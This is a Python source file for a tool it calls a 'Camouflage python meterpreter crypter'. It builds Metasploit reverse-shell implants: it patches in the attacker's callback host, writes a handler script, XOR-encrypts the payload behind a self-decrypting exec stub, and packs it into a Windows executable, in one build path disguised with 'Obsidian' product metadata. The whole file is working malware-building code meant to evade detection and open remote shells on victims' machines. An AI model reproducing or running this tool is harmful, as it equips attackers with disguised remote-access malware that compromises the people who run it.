import os
import random
import functools
import base64
import time
from struct import pack, unpack
import secrets
import argparse
import sys
import user_agent
import zipfile
import shutil


class ReversePython:
    
    def __init__(self) -> None:
        self.plat_id = 21
        self.arch_id = 20
        self.sum = 95
        self.URI_CHECKSUM_UUID_MIN_LEN = 27
        self.URI_CHECKSUM_CONN_MAX_LEN = 128

    def checksum8(self, uri: bytes) -> int:
        return (functools.reduce(lambda x, y: x + y, list(uri)) or 0) % 0x100

    def generate_uri_uuid(self) -> bytes:
        puid = secrets.token_bytes(8)
        tstamp = int(time.time())
        plat_xor = random.randint(1, 255)
        arch_xor = random.randint(1, 255)
        time_xor = unpack(">I",pack("4B",plat_xor, arch_xor, plat_xor, arch_xor))[0]
        return puid + pack(">4BI",
            plat_xor, arch_xor, 
            plat_xor ^ self.plat_id,
            arch_xor ^ self.arch_id,
            time_xor ^ tstamp )

    def generate_uri_checksum(self, uuid: bytes) -> bytes:
        curl_uri_len = self.URI_CHECKSUM_UUID_MIN_LEN + random.randint(1, self.URI_CHECKSUM_CONN_MAX_LEN - self.URI_CHECKSUM_UUID_MIN_LEN)
        prefix = base64.urlsafe_b64encode(uuid).rstrip(b'=')
        gen_len = curl_uri_len - len(prefix)
        if gen_len < 40:
            while True:
                uri = prefix + secrets.token_urlsafe(gen_len).encode()
                if self.checksum8(uri) == self.sum:
                    return uri
        
        prefix = secrets.token_urlsafe(gen_len-20).encode()
        while True:
            uri = prefix + secrets.token_urlsafe(20).encode()
            if self.checksum8(uri) == self.sum:
                return uri

def generate_file(data: argparse.Namespace) -> None:
    rev = ReversePython()
    uuid = rev.generate_uri_uuid()
    uri = rev.generate_uri_checksum(uuid)
    params = data.host.split(":")
    try:
        os.mkdir("temp")
        os.mkdir("output")
    except:
        pass
    with open('meterpreter.py', 'r') as f:
        info = f.read()
        metrc = ['use exploit/multi/handler', 'set payload python/meterpreter_reverse_{}'.format(data.payload),'set LHOST {}'.format(params[0]),'set LPORT {}'.format(params[1]), 'exploit -j']
        info = info.replace("PAYLOAD_UUID = ''","PAYLOAD_UUID = '{}'".format(uuid.hex()))

        if data.payload != 'tcp':
            info = info.replace("HTTP_CONNECTION_URL = None", "HTTP_CONNECTION_URL = '{}://{}/{}'".format(data.payload, data.host, uri.decode()))
            if data.ua:
                info = info.replace("HTTP_USER_AGENT = None", "HTTP_USER_AGENT = '{}'".format(data.ua))
            else:
                info = info.replace("HTTP_USER_AGENT = None", "HTTP_USER_AGENT = '{}'".format(user_agent.generate_user_agent()))
            if data.referer:
                info = info.replace("HTTP_REFERER = None", "HTTP_REFERER = '{}'".format(data.referer))
                metrc.append(f"set HttpReferer {data.referer}")
            if data.cookie:
                info = info.replace("HTTP_COOKIE = None", "HTTP_COOKIE = '{}'".format(data.cookie))
                metrc.append(f"set httpcookie {data.cookie}")
            if data.host_header:
                info = info.replace("HTTP_HOST = None", "HTTP_HOST = '{}'".format(data.host_header))
                metrc.append(f"set HttpHostHeader {data.host_header}")
            if data.sct:
                info = info.replace("SESSION_COMMUNICATION_TIMEOUT = 300", "SESSION_COMMUNICATION_TIMEOUT = {}".format(data.sct))
                metrc.append(f"set SessionCommunicationTimeout {data.sct}")
            if data.set:                
                info = info.replace("SESSION_EXPIRATION_TIMEOUT = 604800", "SESSION_EXPIRATION_TIMEOUT = {}".format(data.set))
                metrc.append(f"set SessionExpirationTimeout {data.set}")
            if data.srt:
                info = info.replace("SESSION_RETRY_TOTAL = 3600", "SESSION_RETRY_TOTAL = {}".format(data.srt))
                metrc.append(f"set SessionRetryTotal {data.srt}")
            if data.srw:
                info = info.replace("SESSION_RETRY_WAIT = 10", "SESSION_RETRY_WAIT = {}".format(data.srw))
                metrc.append(f"set SessionRetryWait {data.srw}")
        else:
            info = info.replace("# PATCH-SETUP-STAGELESS-TCP-SOCKET #", "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('{}',{}))".format(params[0],params[1]))       
        fname = secrets.token_urlsafe(8)
        if(data.output):
            outname = data.output.strip(".exe")
        else:
            outname = fname
        #with open('final.py', 'w') as ftemp:
        #    ftemp.write(info)
        KEY = secrets.token_hex(8).encode()
        t = base64.b64encode(info.encode())
        temp = b''
        for i in range(len(t)):
            temp += bytes([t[i] ^ KEY[i % len(KEY)]])
        print("[+] Generating an encrypted python meterpreter")
        w = open("temp/{}.pyw".format(fname),'w')
        r = open("output/{}.rc".format(fname),'w')
        r.writelines(l + "\n" for l in metrc)
        r.close()
        w.write(
f"""import base64
t = base64.b64decode({base64.b64encode(temp)})
KEY = {KEY}
temp = b''
for i in range(len(t)):
    temp += bytes([t[i] ^ KEY[i % len(KEY)]])
temp = base64.b64decode(temp)
exec(temp.decode())""")
        w.close()
        if(data.packer == 'embed'):
            import urllib.request
            SED = f'''[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=1
HideExtractAnimation=1
UseLongFileName=0
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
TargetName=output\\{outname}.exe
FriendlyName=Title
AppLaunched=python.exe {fname}.pyw
PostInstallCmd=<None>
AdminQuietInstCmd=
UserQuietInstCmd= 
'''
            minor = random.randint(8,9)
            build = random.randint(0,10)
            link = f"https://www.python.org/ftp/python/3.{minor}.{build}/python-3.{minor}.{build}-embed-amd64.zip"
            print(f"[+] Downloading a random embedded python version... (3.{minor}.{build})")
            urllib.request.urlretrieve(link, f"temp/{link.rsplit('/',1)[1]}")
            print("[+] Done downloading")
            with zipfile.ZipFile(f"temp/{link.rsplit('/',1)[1]}",'r') as zfile:
                zfile.extractall('temp/python')
            shutil.move(f"temp/{fname}.pyw", "temp/python/")
            files = os.listdir('temp/python/')
            print(f"[+] Generating {fname}.SED")
            file_strings = ''
            for i, f in enumerate(files):
                SED += f"FILE{i}={f}\n"
                file_strings += f"%FILE{i}%=\n"
            SED += f'''[SourceFiles]
SourceFiles0={os.getcwd()}\\temp\\python\\
[SourceFiles0]
'''
            SED += file_strings
            with open(f"temp/{fname}.SED", "w") as wfile:
                wfile.write(SED)
            os.system('IEXPRESS /N /Q temp/{}.SED'.format(fname))
            shutil.rmtree("temp")
            print(f'[+] Done creating final executable "output/{outname}.exe"')
        else:
            p = ''
            if data.icon:
                p = f" --windows-icon-from-ico={data.icon}"
            os.system(f'python -m nuitka --windows-company-name=Obsidian --windows-product-name=Obsidian --windows-file-version=0.14.0.6 --windows-product-version=0.14.0.6 --windows-file-description=Obsidian --onefile --windows-disable-console --remove-output --assume-yes-for-downloads temp/{fname}.py -o output/{outname}.exe' + p)
            shutil.rmtree("temp")
            print(f'[+] Done creating final executable "output/{outname}.exe"')
        
        
if __name__ == "__main__":
    if sys.platform != "win32":
        print("This only works on Windows systems for now")
        sys.exit(1)
    banner = "\n\t\t\t𝕮𝖆𝖒𝖔𝖚𝖋𝖑𝖆𝖌𝖊 ρутнση мєтєяρяєтєя ¢яуρтєя\n"
    try:
        print(banner)
    except:
        print("\n\t\t\tCamouflage python meterpreter crypter\n")
    parser = argparse.ArgumentParser(description='Encryptor for the python stageless meterpreter version',
        formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-p','--payload', type=str, help="Meterpreter connection type.", choices=['http', 'https', 'tcp'], default='http')
    parser.add_argument('-H','--host', type=str, help="Address to connect back to. (127.0.0.1:8080, 192.168.100.2:3000)", required=True)
    parser.add_argument('--packer', default="embed", type=str, choices=['embed', 'compile'],help="Converting script to C code and compile it or embedding the script with a portable Python interpreter.")
    parser.add_argument('-o','--output', type=str, help="generated executable name")
    parser.add_argument('--icon', type=str, help="Path to icon")
    parser.add_argument('--ua',metavar="UserAgent", type=str, help="The user-agent that the payload should use for communication.")
    parser.add_argument('--referer', type=str,help="An optional value to use for the Referer HTTP header.")
    parser.add_argument('--cookie', type=str,help="An optional value to use for the Cookie HTTP header.")
    parser.add_argument('--host-header', type=str,help="An optional value to use for the Host HTTP header.")
    parser.add_argument('--proxy', type=str,help="An optional proxy server IP address or hostname. (http://user:pass@host:port)")
    parser.add_argument('--sct', metavar="SessionCommunicationTimeout",type=int, help='The number of seconds of no activity before this session should be killed.')
    parser.add_argument('--set', metavar="SessionExpirationTimeout",type=int, help='The number of seconds before this session should be forcibly shut down.')
    parser.add_argument('--srt', metavar="SessionRetryTotal",type=int, help='Number of seconds try reconnecting for on network failure.')
    parser.add_argument('--srw', metavar="SessionRetryWait",type=int, help='Number of seconds to wait between reconnect attempts.')
    
    args = parser.parse_args()
    generate_file(args)
